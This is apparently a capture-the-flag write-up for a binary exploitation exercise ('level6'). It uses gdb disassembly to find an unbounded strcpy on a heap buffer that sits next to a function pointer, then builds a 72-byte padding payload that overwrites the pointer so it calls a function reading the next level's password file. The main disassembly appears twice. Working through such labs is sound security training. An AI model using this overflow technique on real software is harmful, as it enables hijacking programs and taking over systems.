(gdb) disassemble n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   ebp
   0x08048455 <+1>:	mov    ebp,esp
   0x08048457 <+3>:	sub    esp,0x18
   0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.

(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"

We will probably need to reach this function that calls system("/bin/cat /home/user/level7/.pass");

Dump of assembler code for function m:
   0x08048468 <+0>:	push   ebp
   0x08048469 <+1>:	mov    ebp,esp
   0x0804846b <+3>:	sub    esp,0x18
   0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave  
   0x0804847b <+19>:	ret    
End of assembler dump.


(gdb) x/s 0x80485d1
0x80485d1:	 "Nope"

this function just calls puts("Nope"); (writes "Nope\n in stdout)

Dump of assembler code for function main:
   0x0804847c <+0>:	push   ebp
   0x0804847d <+1>:	mov    ebp,esp
   0x0804847f <+3>:	and    esp,0xfffffff0
   0x08048482 <+6>:	sub    esp,0x20
   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:	mov    edx,0x8048468
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]      //argv[1]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.

Dump of assembler code for function main:
   0x0804847c <+0>:	push   ebp
   0x0804847d <+1>:	mov    ebp,esp
   0x0804847f <+3>:	and    esp,0xfffffff0
   0x08048482 <+6>:	sub    esp,0x20
   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:	mov    edx,0x8048468
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]      //argv[1]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.

(gdb) x/s 0x8048468
0x8048468 <m>:	 "U\211\345\203\354\030\307\004$х\004\b\350\346\376\377\377\311\303U\211\345\203\344\360\203\354 \307\004$@"

we can see that 0x8048468 is the address of the function m().


Lets analyze the main function:


   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>

Put 0x40 (64) as the first argument to malloc
Call malloc(0x40)

   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax

Save the address returned by malloc in [esp+0x1c] (first buffer)

   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>

Put 4 as the first argument to malloc
Call malloc(4)

   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax

Save the address of the second allocated buffer in [esp+0x18]

   0x080484a5 <+41>:	mov    edx,0x8048468

Load the address of function m() into EDX

   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]

Load the address of the second allocated buffer into EAX

   0x080484ae <+50>:	mov    DWORD PTR [eax],edx

Store the address of m() inside the second allocated buffer

   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4

Load argv into EAX and Move to argv[1]

   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]

EAX contains the pointer to the first character of argv[1]

   0x080484b8 <+60>:	mov    edx,eax

Copy the argv[1] pointer into EDX

   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]

Load the address of the first allocated buffer into EAX

   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx

Put argv[1] as the second argument of strcpy

0x080484c2 <+70>:	mov    DWORD PTR [esp],eax

Put the first allocated buffer as the first argument of strcpy

   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>

Call strcpy (first_buffer, argv[1]);

   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]

Load the address of the second allocated buffer into EAX

   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]

Dereference the second allocated buffer , EAX now contains the address of m()

   0x080484d0 <+84>:	call

Call the function whose address is stored in EAX; this calls m()


the C code should like this :

int main(int argc, char **argv)
{
    char *buffer = malloc(0x40);

    void (**function_ptr)(void) = malloc(4);

    *function_ptr = m;

    strcpy(buffer, argv[1]);

    (*function_ptr)();
}

We know that strcpy has potential overflow vulnerabilities as written in the man:

"If the destination string of a strcpy() is not large  enough,  then  anything  might  happen.
Overflowing fixed-length  string  buffers  is  a favorite cracker technique for taking complete control of the machine"

If our buffer is bigger than 64 bytes , we will start to overflow.

If we overflow the fonction pointer to make it contain the the adress of the n() function instead of the m() function, we will be able to open a shell.



Lets find the address of function_ptr

(gdb) break *0x080484a1
(gdb) run
(gdb) info registers eax
eax            0x804a050	134520912

the address of function_ptr is 0x804a050

Now lets find the address of buffer :

(gdb) x/wx $esp+0x1c 0xbffff63c: 0x0804a008

Find the required padding to reach function_ptr by substracting the buffer address to the function_ptr address:

(gdb) p/d 0x804a050-0x0804a008
$3 = 72

We need to create a 72 padding string, followed by the address of the n() function :

address of n() 0x08048454 -> ""\x54\x84\x04\x08" with little endian

We can produce our input like this:

python -c 'print "A" * 72 + "\x54\x84\x04\x08"'

Since the program expects the payload in argv[1], we need to pass the generated payload as a command-line argument. We can use command substitution so that the output of the Python command becomes argv[1].

./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
